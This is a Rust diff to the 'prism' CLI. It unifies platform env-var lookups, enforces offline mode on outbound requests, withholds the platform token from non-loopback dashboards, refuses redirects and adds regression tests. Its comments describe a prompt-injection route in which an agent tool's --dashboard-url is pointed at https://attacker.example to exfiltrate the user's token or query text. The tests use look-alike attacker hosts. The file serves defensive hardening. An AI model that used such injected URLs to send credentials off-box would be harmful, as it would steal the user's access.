@@ -36,6 +36,7 @@ use prism_client::auth::{DeviceCodeResponse, TokenResponse};
 use prism_proto::NodeCapabilities;
 use prism_python_bridge::{ToolServer, ensure_venv};
 use prism_runtime::auth::{self, AuthSurface, PlatformAuth};
+use prism_runtime::platform_env::PlatformVar;
 use prism_runtime::{PlatformEndpoints, PrismPaths, StoredCredentials};
 
 // Loopback detection lives with the local-server probe that also needs it,
@@ -1514,7 +1515,7 @@ fn preflight_command_auth(command: Option<&Commands>) -> Result<()> {
     if let Some(Commands::Node {
         command: NodeCommands::Up { offline, .. },
     }) = command
-        && !offline
+        && !(*offline || prism_runtime::offline::enabled())
     {
         // `node up` needs Python later, but missing auth must be reported
         // before venv provisioning can block or touch the network.
@@ -2286,7 +2287,9 @@ async fn main() -> Result<()> {
             // loaded, an ANTHROPIC_API_KEY in it would otherwise shadow the
             // platform JWT and 401 every platform LLM call.
             let api_key = std::env::var("LLM_API_KEY")
-                .or_else(|_| std::env::var("MARC27_TOKEN"))
+                .ok()
+                .or_else(|| PlatformVar::TOKEN.get())
+                .ok_or(std::env::VarError::NotPresent)
                 .or_else(|_| std::env::var("ANTHROPIC_API_KEY"))
                 .or_else(|_| std::env::var("OPENAI_API_KEY"))
                 .ok()
@@ -2376,9 +2379,9 @@ async fn main() -> Result<()> {
                     // value onto X-API-Key and a JWT onto Bearer automatically.
                     // Provider keys are NOT platform credentials.
                     let marc27_key = std::env::var("LLM_API_KEY")
-                        .or_else(|_| std::env::var("MARC27_API_KEY"))
-                        .or_else(|_| std::env::var("MARC27_TOKEN"))
                         .ok()
+                        .or_else(|| PlatformVar::API_KEY.get())
+                        .or_else(|| PlatformVar::TOKEN.get())
                         .or_else(|| platform_token.clone());
                     (
                         marc27_llm_base_url(&paths, &endpoints.api_base, &cfg_llm.url)?,
@@ -3184,7 +3187,13 @@ async fn main() -> Result<()> {
                     platform_node_id: daemon_platform_node_id,
                     rbac_db_path: daemon_rbac_db_path,
                     org_id: daemon_org_id,
-                    offline,
+                    // Merge the subcommand flag with the process-wide policy.
+                    // `--offline` on `node up` is its own arg (see NodeCommands::Up)
+                    // and was passed through raw, so `PRISM_OFFLINE=1 prism node up`
+                    // left this false: the daemon resolved a real credential and
+                    // opened `wss://…?token=<token>` (node/daemon.rs:525). Same
+                    // shape as main.rs:1640's `cli.offline || offline::enabled()`.
+                    offline: offline || prism_runtime::offline::enabled(),
                     tool_invoker: Some(tool_invoke_tx),
                     audit_emitter,
                 };
@@ -3192,13 +3201,12 @@ async fn main() -> Result<()> {
                 // ── Start mesh networking (mDNS discovery + optional broadcast) ──
                 let mesh_cancel = tokio_util::sync::CancellationToken::new();
                 // Resolve Kafka brokers: explicit flag > implicit from --with-kafka
-                let resolved_kafka_brokers = kafka_brokers.clone().or_else(|| {
-                    if with_kafka {
-                        Some("127.0.0.1:9092".to_string())
-                    } else {
-                        None
-                    }
-                });
+                let kafka_requested = kafka_brokers.is_some() || with_kafka;
+                let resolved_kafka_brokers =
+                    resolve_kafka_brokers(kafka_brokers.as_deref(), with_kafka);
+                if kafka_requested && resolved_kafka_brokers.is_none() {
+                    eprintln!("  ⚠ Kafka mesh transport disabled: offline mode.");
+                }
 
                 let mesh_config = prism_mesh::MeshConfig {
                     node_name: daemon_options.name.clone(),
@@ -5029,11 +5037,11 @@ async fn handle_federation_command(
             let state = paths.load_cli_state().ok().unwrap_or_default();
             let creds = state.credentials.as_ref();
             let endpoints = PlatformEndpoints::from_env();
-            let credential_source = if std::env::var("MARC27_API_KEY")
-                .ok()
-                .is_some_and(|value| !value.trim().is_empty())
-            {
-                "MARC27_API_KEY"
+            // Report the name that actually supplied the key, not a fixed
+            // string -- an operator with both spellings set otherwise cannot
+            // tell which one the process read.
+            let credential_source = if let Some(name) = PlatformVar::API_KEY.source() {
+                name
             } else if creds.is_some() {
                 "cli-state session"
             } else {
@@ -5701,8 +5709,8 @@ fn resolve_workflow_llm_api_key_for_target(
         crate::chat_config::ChatTarget::Marc27 { .. } => non_empty(
             std::env::var("LLM_API_KEY")
                 .ok()
-                .or_else(|| std::env::var("MARC27_API_KEY").ok())
-                .or_else(|| std::env::var("MARC27_TOKEN").ok())
+                .or_else(|| PlatformVar::API_KEY.get())
+                .or_else(|| PlatformVar::TOKEN.get())
                 .or_else(|| cfg_llm.resolve_api_key())
                 .or(platform_token),
         ),
@@ -7162,15 +7170,23 @@ fn marc27_auth_from(auth: PlatformAuth) -> prism_compute::Marc27Auth {
 /// the single CLI auth chokepoint: it accepts API-key-only users, stored
 /// sessions, and legacy credentials, and never starts interactive auth.
 fn resolve_agent_auth() -> Result<(String, PlatformAuth)> {
-    if std::env::var("PRISM_OFFLINE").is_ok_and(|v| v == "1") {
+    // `offline::enabled()`, not a re-derived `== "1"`. This function is the
+    // gate ~25 platform commands rely on, and it trimmed nothing — so
+    // `PRISM_OFFLINE=" 1"` (a routine shell/CI artifact) was honoured by every
+    // `offline::enabled()` caller and ignored here. It was not exploitable
+    // through `prism` only because main.rs:1640 canonicalises the var first,
+    // which is an accidental safety net: `prism-node` skipped that preamble
+    // and was online under hard offline until f91917a2.
+    if prism_runtime::offline::enabled() {
         anyhow::bail!(
             "offline mode: this command needs the hosted platform \
              (remove --offline to use it)"
         );
     }
 
-    let default_api_base = std::env::var("MARC27_API_URL")
-        .unwrap_or_else(|_| "https://api.marc27.com/api/v1".to_string());
+    let default_api_base = PlatformVar::API_URL
+        .get()
+        .unwrap_or_else(|| "https://api.marc27.com/api/v1".to_string());
     let paths = PrismPaths::discover().ok();
     let resolved = auth::resolve_from_environment(paths.as_ref(), &default_api_base)?;
     Ok((resolved.api_base, resolved.credential))
@@ -9461,14 +9477,77 @@ async fn create_dashboard_session_for_user(
     .await
 }
 
+/// Decide whether the platform credential may be sent to this dashboard.
+///
+/// Extracted so the RULE is testable. Asserting it through
+/// `create_dashboard_session_*` cannot work: with nothing listening the
+/// request fails before anything is transmitted, so such a test passes whether
+/// the token was withheld or not — it proves only that the error text is
+/// clean. This function is the decision itself.
+fn platform_token_for<'a>(dashboard_url: &str, token: Option<&'a str>) -> Option<&'a str> {
+    match token {
+        Some(_) if !prism_runtime::offline::is_loopback_url(dashboard_url) => {
+            eprintln!(
+                "note: not sending your platform credential to {dashboard_url} \
+                 — it is not a loopback address. The session is created without \
+                 platform access."
+            );
+            None
+        }
+        other => other,
+    }
+}
+
+/// Create a dashboard session, optionally handing the dashboard a platform
+/// token so it can call the platform on the user's behalf.
+///
+/// `platform_token` is only ever sent to a LOOPBACK dashboard.
+///
+/// `--dashboard-url` documents itself as "Dashboard URL of the running node"
+/// and defaults to `http://127.0.0.1:7327` — it exists to change YOUR node's
+/// port, not to name a third party. But it is a free-form string on
+/// `mesh publish/subscribe/unsubscribe` and on `query --federated`, and the
+/// agent tool schemas for those (agent/src/command_tools.rs) expose it to the
+/// model. A prompt injection setting
+/// `--dashboard-url https://attacker.example` therefore POSTed the user's live
+/// platform access token, read from `~/.prism/credentials.json`, to a host of
+/// the attacker's choosing. `PermissionMode::LocalOnly`'s env-stripping does
+/// not help: the credential comes off disk, not out of the environment.
+///
+/// Withholding it is a supported degradation rather than a new failure mode —
+/// `create_dashboard_session_for_user` already calls this with `None`, so a
+/// tokenless session is an existing, working shape. The session is still
+/// created; only the platform capability is withheld, and the caller is told.
 async fn create_dashboard_session_for_user_with_platform_token(
     dashboard_url: &str,
     user_id: &str,
     display_name: Option<&str>,
     platform_token: Option<&str>,
 ) -> Result<String> {
+    // Hard offline: the dashboard may be remote, so this is a network call
+    // like any other. Loopback stays permitted, matching llm/embed/workflows.
+    prism_runtime::offline::check_url(dashboard_url).map_err(|reason| anyhow!(reason))?;
+
+    let platform_token = platform_token_for(dashboard_url, platform_token);
+
     let url = format!("{dashboard_url}/api/sessions");
-    let resp = reqwest::Client::new()
+    // Never follow a redirect on this call.
+    //
+    // `reqwest`'s default is `Policy::limited(10)`, and its cross-host
+    // scrubbing (`redirect.rs:244-247`) removes AUTHORIZATION / COOKIE /
+    // PROXY_AUTHORIZATION — HEADERS only. The platform token here is in the
+    // BODY, which that never touches, and on 307/308 the method and body are
+    // preserved and resent. Both guards above run on `dashboard_url`, the
+    // INITIAL url; a redirect target is never re-checked. So a process
+    // answering the loopback dashboard port could 307 the credential off-box.
+    //
+    // A session mint has no legitimate reason to be redirected, so refusing
+    // outright is both simpler and stricter than re-validating per hop.
+    let client = reqwest::Client::builder()
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .context("failed to build the dashboard HTTP client")?;
+    let resp = client
         .post(&url)
         .json(&serde_json::json!({
             "user_id": user_id,
@@ -10721,8 +10800,8 @@ async fn select_project(
 }
 
 fn env_project_override() -> Option<String> {
-    std::env::var("MARC27_PROJECT_ID")
-        .ok()
+    PlatformVar::PROJECT_ID
+        .get()
         .map(|value| value.trim().to_string())
         .filter(|value| !value.is_empty())
 }
@@ -10832,7 +10911,7 @@ async fn resolve_node_token(
         tracing::debug!("using durable node token (does not rotate)");
         return Ok((node_token.key, None));
     }
-    if let Ok(key) = std::env::var("MARC27_API_KEY") {
+    if let Some(key) = PlatformVar::API_KEY.get() {
         let key = key.trim().to_string();
         if !key.is_empty() {
             return Ok((key, None));
@@ -10963,11 +11042,48 @@ fn print_node_status(caps: &NodeCapabilities, endpoints: &PlatformEndpoints) {
 
 // ── prism query --federated ────────────────────────────────────────────
 
+/// Which Kafka brokers the mesh may connect to, if any.
+///
+/// Kafka is a TCP client started SEPARATELY from `start_mesh`, so gating the
+/// mesh task does not cover it — and it never appears in a `reqwest` grep,
+/// which is exactly how 9926eac0's "only two outbound sends" claim came to be
+/// wrong. Returning None under hard offline disables the whole block at its
+/// source rather than at each use.
+///
+/// `enabled()` rather than `check_url`: brokers are scheme-less `host:port`
+/// and a list can name several, so there is no single URL to check.
+///
+/// Extracted so the decision is testable. It was inline in `main()` — the
+/// higher-blast-radius half of the mesh work (`--kafka-brokers` is a free-form
+/// flag naming an arbitrary REMOTE host, where mDNS is LAN-only) and the half
+/// with no coverage. Best-covered path was not highest-risk path.
+fn resolve_kafka_brokers(explicit: Option<&str>, with_kafka: bool) -> Option<String> {
+    if prism_runtime::offline::enabled() {
+        return None;
+    }
+    explicit
+        .map(str::to_string)
+        .or_else(|| with_kafka.then(|| "127.0.0.1:9092".to_string()))
+}
+
 async fn handle_federated_query(
     query: &str,
     dashboard_url: &str,
     paths: &prism_runtime::PrismPaths,
 ) -> Result<()> {
+    // Every send below is gated, and the gates are NOT allowed to be
+    // swallowed. `create_dashboard_session*` already calls `check_url`, but
+    // this function discarded its Result with `.ok()` and then built a
+    // SEPARATE, ungated `reqwest::Client::new()` request and sent it anyway.
+    // A guard that grep finds but the request never consults is worse than no
+    // guard: it reads as covered.
+    //
+    // `query_federated` is an agent tool with `requires_approval: false`
+    // (agent/src/command_tools.rs:320-326) and `dashboard_url` is in its
+    // schema, so an injected prompt could name the host and POST the user's
+    // literal query text to it with no human in the loop.
+    prism_runtime::offline::check_url(dashboard_url).map_err(|r| anyhow!(r))?;
+
     // Step 1: Get peer list from the running node
     let peers_url = format!("{dashboard_url}/api/mesh/nodes");
     let resp: serde_json::Value = reqwest::get(&peers_url)
@@ -11027,6 +11143,16 @@ async fn handle_federated_query(
         let port = peer["port"].as_u64().unwrap_or(7327);
         let name = peer["name"].as_str().unwrap_or("unknown");
         let peer_base = format!("http://{}:{}", addr, port);
+        // Second-order: these addresses come from the JSON the previous host
+        // returned, so a hostile responder can name any peer it likes. Gate
+        // each one rather than trusting step 1's check to cover them.
+        if let Err(reason) = prism_runtime::offline::check_url(&peer_base) {
+            println!(
+                "[{}] skipped — {reason}",
+                peer["name"].as_str().unwrap_or("unknown")
+            );
+            continue;
+        }
         let peer_url = format!("{peer_base}/api/query");
         let body = serde_json::json!({"query": query, "mode": "nl"});
         let peer_session =
@@ -11473,6 +11599,10 @@ async fn handle_report(
         });
 
         let url = format!("{}/support/tickets", endpoints.api_base);
+        // `prism report` builds its own client rather than going through
+        // PlatformClient, so it inherited none of that type's offline guard
+        // and posted the session Bearer under PRISM_OFFLINE=1.
+        prism_runtime::offline::check_url(&url).map_err(|reason| anyhow!(reason))?;
         let resp = reqwest::Client::new()
             .post(&url)
             .header("Authorization", format!("Bearer {}", c.access_token))
@@ -11608,7 +11738,7 @@ async fn fetch_model_catalog(paths: &PrismPaths) -> Vec<serde_json::Value> {
     let cache_is_fresh = cache
         .as_ref()
         .is_some_and(prism_agent::models::CatalogCache::is_fresh);
-    let offline = std::env::var("PRISM_OFFLINE").as_deref() == Ok("1");
+    let offline = prism_runtime::offline::enabled();
     if offline || cache_is_fresh {
         models.extend(cache.map(|c| c.models).unwrap_or_default());
         return models;
@@ -11728,6 +11858,205 @@ fn resolve_unauth_llm_url(fallback_url: &str) -> anyhow::Result<String> {
 
 #[cfg(test)]
 mod tests {
+    /// The credential must never leave the machine for a host the caller
+    /// merely named. `--dashboard-url` is a free string on `mesh publish` and
+    /// `query --federated`, and the agent tool schemas expose it to the model,
+    /// so a prompt injection could point it anywhere.
+    /// The guard existed, ran, returned Err — and the caller `.ok()`-swallowed
+    /// it, then built a separate ungated client and sent anyway. `query_federated`
+    /// is `requires_approval: false` with `dashboard_url` in its schema, so an
+    /// injected prompt could POST the user's literal query text off-box.
+    #[tokio::test]
+    #[allow(clippy::await_holding_lock)]
+    async fn federated_query_is_refused_offline_before_any_send() {
+        let _guard = boot_checks::ENV_LOCK
+            .lock()
+            .unwrap_or_else(|p| p.into_inner());
+        // RAII, not a trailing remove_var: `.expect_err()` below can panic,
+        // and an unwind past a manual cleanup leaves PRISM_OFFLINE set for the
+        // rest of the binary — which then fails unrelated tests like
+        // `a_signed_in_user_still_syncs_tools`, whose `should_sync_tools` gate
+        // reads it. `clear_platform_env()` does NOT clear this var.
+        struct OfflineEnvGuard(Option<String>);
+        impl Drop for OfflineEnvGuard {
+            fn drop(&mut self) {
+                unsafe {
+                    match self.0.take() {
+                        Some(v) => std::env::set_var(prism_runtime::offline::ENV, v),
+                        None => std::env::remove_var(prism_runtime::offline::ENV),
+                    }
+                }
+            }
+        }
+        let _restore = OfflineEnvGuard(std::env::var(prism_runtime::offline::ENV).ok());
+        unsafe { std::env::set_var(prism_runtime::offline::ENV, "1") };
+
+        let dir = tempfile::tempdir().expect("tempdir");
+        let root = dir.path().to_path_buf();
+        let paths = prism_runtime::PrismPaths {
+            config_dir: root.clone(),
+            cache_dir: root.clone(),
+            data_dir: root.clone(),
+            state_dir: root,
+        };
+        // TEST-NET-3: a full connect attempt would cost seconds. Refusing by
+        // policy is immediate, so a fast failure is itself part of the proof.
+        let err = handle_federated_query("secret query text", "http://203.0.113.9:7327", &paths)
+            .await
+            .expect_err("offline must refuse a remote dashboard");
+
+        let msg = format!("{err:#}");
+        assert!(msg.contains("offline mode"), "{msg}");
+        assert!(
+            !msg.contains("secret query text"),
+            "query text surfaced in the error path: {msg}"
+        );
+    }
+
+    /// The higher-blast-radius half of the mesh offline work, and the half
+    /// that had no test. `--kafka-brokers` is a free-form flag naming an
+    /// arbitrary REMOTE host; mDNS is LAN-only. The mDNS gate got a
+    /// mutation-tested test and this one got prose.
+    #[test]
+    fn kafka_brokers_resolve_to_none_under_hard_offline() {
+        let _guard = boot_checks::ENV_LOCK
+            .lock()
+            .unwrap_or_else(|p| p.into_inner());
+
+        struct OfflineEnvGuard(Option<String>);
+        impl Drop for OfflineEnvGuard {
+            fn drop(&mut self) {
+                unsafe {
+                    match self.0.take() {
+                        Some(v) => std::env::set_var(prism_runtime::offline::ENV, v),
+                        None => std::env::remove_var(prism_runtime::offline::ENV),
+                    }
+                }
+            }
+        }
+        let _restore = OfflineEnvGuard(std::env::var(prism_runtime::offline::ENV).ok());
+
+        unsafe { std::env::set_var(prism_runtime::offline::ENV, "1") };
+        // An explicitly named REMOTE broker is the case that matters.
+        assert_eq!(
+            resolve_kafka_brokers(Some("broker.example:9092"), false),
+            None
+        );
+        assert_eq!(
+            resolve_kafka_brokers(None, true),
+            None,
+            "--with-kafka default"
+        );
+        assert_eq!(resolve_kafka_brokers(None, false), None);
+
+        // Online: every input resolves as before. Without this the assertions
+        // above would pass even if the function returned None unconditionally.
+        unsafe { std::env::remove_var(prism_runtime::offline::ENV) };
+        assert_eq!(
+            resolve_kafka_brokers(Some("broker.example:9092"), false).as_deref(),
+            Some("broker.example:9092")
+        );
+        assert_eq!(
+            resolve_kafka_brokers(None, true).as_deref(),
+            Some("127.0.0.1:9092"),
+            "--with-kafka still defaults to loopback"
+        );
+        assert_eq!(
+            resolve_kafka_brokers(None, false),
+            None,
+            "neither flag means no Kafka, offline or not"
+        );
+        // An explicit broker outranks the --with-kafka default.
+        assert_eq!(
+            resolve_kafka_brokers(Some("explicit:1234"), true).as_deref(),
+            Some("explicit:1234")
+        );
+    }
+
+    #[test]
+    fn platform_token_only_goes_to_a_loopback_dashboard() {
+        // Loopback, in the spellings is_loopback_url accepts.
+        for ok in [
+            "http://127.0.0.1:7327",
+            "http://localhost:7327",
+            "http://[::1]:7327",
+        ] {
+            assert_eq!(
+                platform_token_for(ok, Some("live-token")),
+                Some("live-token"),
+                "{ok} is the user's own node"
+            );
+        }
+        // Anything else, including a private LAN address, is withheld.
+        for off_box in [
+            "https://attacker.example/x",
+            "http://203.0.113.9:7327",
+            "http://10.0.0.4:7327",
+            // A DOMAIN that merely looks loopback. This is the exact bug shape
+            // 854a9345 fixed in offline::is_loopback_url, pinned HERE too so
+            // the guard is regression-proof at its point of use and not only
+            // by delegation.
+            "http://127.evil.example/",
+            "http://127.0.0.1.attacker.example/",
+        ] {
+            assert_eq!(
+                platform_token_for(off_box, Some("live-token")),
+                None,
+                "{off_box} must not receive the platform credential"
+            );
+        }
+        // No token in means no token out, loopback or not.
+        assert_eq!(platform_token_for("http://127.0.0.1:7327", None), None);
+    }
+
+    /// Hard offline refuses outright — and still permits loopback, matching
+    /// llm/embed/workflows rather than the blanket platform-client rule.
+    #[tokio::test]
+    #[allow(clippy::await_holding_lock)]
+    async fn dashboard_session_is_refused_offline_but_loopback_still_allowed() {
+        let _guard = boot_checks::ENV_LOCK
+            .lock()
+            .unwrap_or_else(|p| p.into_inner());
+        // RAII, not a trailing remove_var. The `.expect_err` calls below can
+        // panic — and a panic there is EXACTLY the regression this test exists
+        // to catch (the guard lets a request through and returns Ok). An
+        // unwind past manual cleanup leaks PRISM_OFFLINE into every later test
+        // in this binary. `federated_query_is_refused_offline_before_any_send`
+        // 150 lines up carries a comment saying precisely this; this test did
+        // not follow it.
+        let _restore = prism_runtime::offline::test_support::OfflineEnvGuard::set("1");
+
+        let remote = create_dashboard_session_for_user_with_platform_token(
+            "http://203.0.113.9:7327",
+            "user-1",
+            None,
+            None,
+        )
+        .await
+        .expect_err("offline must refuse a remote dashboard");
+        let remote_msg = format!("{remote:#}");
+
+        // Loopback is NOT refused by the policy; it fails on connect instead.
+        let local = create_dashboard_session_for_user_with_platform_token(
+            "http://127.0.0.1:1",
+            "user-1",
+            None,
+            None,
+        )
+        .await
+        .expect_err("nothing is listening on port 1");
+        let local_msg = format!("{local:#}");
+
+        assert!(
+            remote_msg.contains("offline mode"),
+            "remote must be refused by policy: {remote_msg}"
+        );
+        assert!(
+            !local_msg.contains("offline mode"),
+            "loopback must not be refused by policy: {local_msg}"
+        );
+    }
+
     use super::*;
 
     #[test]
@@ -11905,7 +12234,7 @@ mod tests {
         // If MARC27_API_KEY happens to be set in the test env, the function's
         // API-key branch short-circuits and this contract isn't exercisable —
         // skip gracefully rather than racing the global env.
-        if std::env::var("MARC27_API_KEY").is_ok() {
+        if PlatformVar::API_KEY.get().is_some() {
             eprintln!(
                 "skipping resolve_node_token_fresh_creds_returns_no_rotation: \
                  MARC27_API_KEY is set in the env"
@@ -12261,7 +12590,19 @@ mod tests {
 
     #[test]
     fn env_project_override_ignores_empty_values() {
+        // Must hold the shared guard and clear BOTH spellings.
+        //
+        // This test took no lock and cleared only the historical name. That
+        // was safe while nothing else wrote PROJECT_ID — but `cffcba9a`
+        // migrated `env_project_override` onto `PlatformVar`, so it now reads
+        // `PRISM_PROJECT_ID` too and PREFERS it. Any concurrent test setting
+        // the neutral name made this one fail with a value it never set, on a
+        // machine-dependent schedule. It flaked exactly that way.
+        let _guard = boot_checks::ENV_LOCK
+            .lock()
+            .unwrap_or_else(|p| p.into_inner());
         unsafe {
+            std::env::remove_var("PRISM_PROJECT_ID");
             std::env::remove_var("MARC27_PROJECT_ID");
         }
         assert_eq!(env_project_override(), None);
@@ -12273,7 +12614,13 @@ mod tests {
             std::env::set_var("MARC27_PROJECT_ID", "project-123");
         }
         assert_eq!(env_project_override(), Some("project-123".to_string()));
+        // The neutral name outranks the historical one, same as everywhere.
         unsafe {
+            std::env::set_var("PRISM_PROJECT_ID", "neutral-wins");
+        }
+        assert_eq!(env_project_override(), Some("neutral-wins".to_string()));
+        unsafe {
+            std::env::remove_var("PRISM_PROJECT_ID");
             std::env::remove_var("MARC27_PROJECT_ID");
         }
     }
